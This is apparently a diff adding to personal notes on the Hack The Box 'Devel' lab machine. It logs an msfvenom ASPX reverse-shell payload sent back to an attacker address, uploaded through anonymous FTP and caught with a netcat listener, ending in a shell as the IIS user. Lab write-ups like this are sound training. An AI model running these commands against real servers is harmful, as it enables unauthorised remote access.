@@ -140,3 +140,44 @@ thoth@kali:~/Projects/htb-notes/machines/Devel/dumps$ curl -v -X TRACE -H "Host:
 </html>
 ```
 ... the result being blocked by the browser with `SecurityError: The operation is insecure.`. We're trying old shit.
+
+#### Watched Ippsec, CyberMentor
+
+ - I saw the proper entry point, I was not aware of the `msfvenom` tool to generate malware in specific formats. I see now we can easily generate exploit scripts to place on vulnerable servers, even without knowing how the scripts themselves work.
+
+ - Going to try a non-meterpreter route first. Issuing a listen on netcat: `nc -lvnp 7680`
+
+ - Generating attack script with `msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=7680 -f aspx > shell.aspx`
+
+ - Upload via `send` on the anonymous FTP access
+
+ - Execute the script by navigating browser to `http://10.10.10.5/shell.aspx`
+
+```shell
+thoth@kali:~/Projects/htb-notes/machines/Devel$ nc -lvnp 7680
+listening on [any] 7680 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.5] 49178
+```
+
+This failed. Just hung there, several times. Decided to try a different exploit:
+
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=7680 -f aspx > shell.aspx`
+
+ - Upload to FTP. Re-run `nc -lvp 7680`, fire it off, and... success:
+
+```powershell
+thoth@kali:~/Projects/htb-notes/machines/Devel$ nc -lvp 7680
+listening on [any] 7680 ...
+10.10.10.5: inverse host lookup failed: Unknown host
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.5] 49181
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\web
+
+c:\windows\system32\inetsrv>
+```
+
+Ok, so I'm in webserver user-space. Privilege escalation is next but let's see if we can find info first.
